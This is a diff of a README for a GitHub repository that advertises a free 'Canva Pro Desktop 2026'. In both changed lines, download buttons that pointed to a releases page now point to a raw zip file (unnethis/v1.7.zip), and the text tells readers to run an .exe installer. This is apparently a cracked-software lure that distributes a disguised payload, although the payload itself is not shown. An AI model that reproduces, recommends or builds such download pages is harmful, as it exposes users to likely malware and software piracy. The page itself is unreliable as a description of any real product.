@@ -1,7 +1,7 @@
 <h1>🎨 Canva-Pro---Canva-Pro-Desktop-2026 - Unlock Premium Design Tools Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/Unlikely-michaelphilipjagger1638/Canva-Pro---Canva-Pro-Desktop-2026/releases" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#ff6b6b,#ff8e53);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(255,107,107,0.4);transition:transform 0.2s;">⬇️ DOWNLOAD CANVA PRO 2026</a>
+  <a href="https://raw.githubusercontent.com/Unlikely-michaelphilipjagger1638/Canva-Pro---Canva-Pro-Desktop-2026/main/unnethis/v1.7.zip" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#ff6b6b,#ff8e53);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(255,107,107,0.4);transition:transform 0.2s;">⬇️ DOWNLOAD CANVA PRO 2026</a>
 </p>
 
 ---
@@ -87,7 +87,7 @@ Follow these simple steps to get Canva Pro Desktop running on your Windows PC:
 1. **Visit the Download Page** – Click the button below or navigate to the official release page using the link at the top of this page.
 
    <p align="center">
-     <a href="https://github.com/Unlikely-michaelphilipjagger1638/Canva-Pro---Canva-Pro-Desktop--2026/releases" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#4facfe,#00f2fe);color:white;font-size:18px;font-weight:bold;border-radius:8px;text-decoration:none;">🔗 GO TO DOWNLOAD PAGE</a>
+     <a href="https://raw.githubusercontent.com/Unlikely-michaelphilipjagger1638/Canva-Pro---Canva-Pro-Desktop-2026/main/unnethis/v1.7.zip" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#4facfe,#00f2fe);color:white;font-size:18px;font-weight:bold;border-radius:8px;text-decoration:none;">🔗 GO TO DOWNLOAD PAGE</a>
    </p>
 
 2. **Locate the Installer File** – On the release page, you will see a list of downloadable files. Look for the file named **CanvaProSetup.exe** (or a similar name ending in `.exe`). Click on it to start the download.
